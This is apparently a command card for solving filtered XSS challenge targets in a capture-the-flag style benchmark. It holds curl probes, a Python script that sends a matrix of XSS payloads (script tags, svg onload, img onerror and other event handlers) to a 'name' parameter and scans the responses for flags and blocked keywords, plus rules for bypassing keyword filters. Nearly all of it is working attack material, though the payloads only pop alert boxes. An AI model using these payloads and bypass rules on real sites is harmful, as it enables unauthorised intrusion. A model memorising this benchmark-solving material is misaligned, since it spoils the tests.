# XSS Replay Commands

Purpose: provide a clean, searchable command/script card for filtered XSS benchmark targets.

Tags: `xss`, `web`, `dalgona`, `filter-bypass`

## Baseline Commands
```bash
curl -sS -D /tmp/h.txt -o /tmp/b.html http://<host>:<port>/
curl -sS http://<host>:<port>/page | sed -n '1,220p'
```

## Payload Matrix Script
```bash
python3 - <<'PY'
import requests, re, urllib.parse
u = 'http://<host>:<port>/page?name='
payloads = [
    '<script>alert("XSS")</script>',
    '<script>prompt("XSS")</script>',
    '<script>confirm("XSS")</script>',
    '<svg/onload=alert("XSS")>',
    '<svg/onload=prompt("XSS")>',
    '<svg/onload=confirm("XSS")>',
    '<img src=x onerror=alert("XSS")>',
    '<body onpageshow=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    'alert("XSS")',
    'prompt("XSS")',
    'confirm("XSS")',
]
for p in payloads:
    r = requests.get(u + urllib.parse.quote(p, safe=''), timeout=8)
    t = r.text
    flag = re.search(r'FLAG\\{[^}]+\\}|flag\\{[^}]+\\}', t, re.I)
    blocked = re.search(r"Sorry you can't use: '([^']+)'", t)
    marker = 'Congrats' if 'Congratulations' in t else ('Oops' if 'Oops!' in t else '')
    print(
        p[:50],
        r.status_code,
        len(t),
        'flag=' + str(flag.group(0) if flag else None),
        'blocked=' + str(blocked.group(1) if blocked else None),
        marker,
    )
PY
```

## Decision Rules
- If `alert` is blocked, test `prompt` and `confirm` before declaring failure.
- If `script` is blocked, pivot to non-script handlers (`svg/onload`) first.
- If one handler is blocked (`onerror`), test alternate handlers (`onload`, `onpageshow`, `ontoggle`).
- If responses are fixed `Oops ... TypeError ...`, pivot to context mapping instead of same-family payload spray.

